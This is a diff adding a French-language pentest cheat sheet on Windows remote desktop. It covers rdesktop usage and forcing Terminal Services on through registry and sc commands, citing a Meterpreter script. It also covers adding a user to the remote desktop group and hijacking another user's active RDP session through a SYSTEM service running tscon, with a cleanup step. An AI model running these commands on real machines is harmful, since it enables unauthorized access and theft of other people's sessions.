@@ -1,0 +1,52 @@
+# rdesktop - remote desktop - rdp
+
+# lister les sessions
+qwinsta
+or
+query session
+
+# partage d'un disque, clavier fr, et une "color depth" de 16 NB. à confirmer
+# mais apparemment ça ne marche pas sur XP, mais marche avec 2003
+rdesktop  -r disk:tmp=/home/sm/tmp -k fr -g 1024x768 -a 16 1.2.3.4
+windows: \\tsclient\tmp
+
+# Services Terminal Server / remote desktop / TermService
+
+# Conditions pour que le service TermService se lance maintenant et
+# automatiquement apres demarrage (cf. msf3/scripts/meterpreter/getgui.rb)
+
+1) autoriser les connexions
+HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections == 0
+
+2) persistence au reboot
+HKLM\\SYSTEM\\CurrentControlSet\\Services\\TermService\Start == 2
+Ou bien:
+sc config termservice start= auto
+
+3) lancer maintenant
+sc start termservice
+
+4) utilisateur doit etre dans le groupe local Administrateurs ou Utilisateurs du bureau à distance et ne doit pas avoir un mot de passe vide
+  en: net localgroup "Remote Desktop Users" seb /add
+  fr: net localgroup "Utilisateurs du Bureau à distance" seb /add
+
+# MITM de session RDP
+http://isc.sans.org/diary.html?storyid=7303
+
+# take over open session
+# http://blog.gentilkiwi.com/securite/vol-de-session-rdp 
+C:\Windows\system32>query session
+ SESSION           UTILISATEUR              ID  ÉTAT    TYPE        PÉRIPHÉRIQUE
+ services                                    0  Déco
+ console                                     1  Conn
+>rdp-tcp#1         user1                     2  Actif   rdpwd
+ rdp-tcp#0         toto                      3  Actif   rdpwd
+ rdp-tcp                                 65536  Écouter
+
+rdp-tcp#0 est la session que nous voulons voler, rdp-tcp#1 est notre session ouverte
+
+sc create givemerdp binpath= "cmd /k tscon rdp-tcp#0 /dest:rdp-tcp#1" type= own
+sc start  givemerdp
+sc delete givemerdp # cleanup when finished
+ou
+lancer tscon avec psexec -s
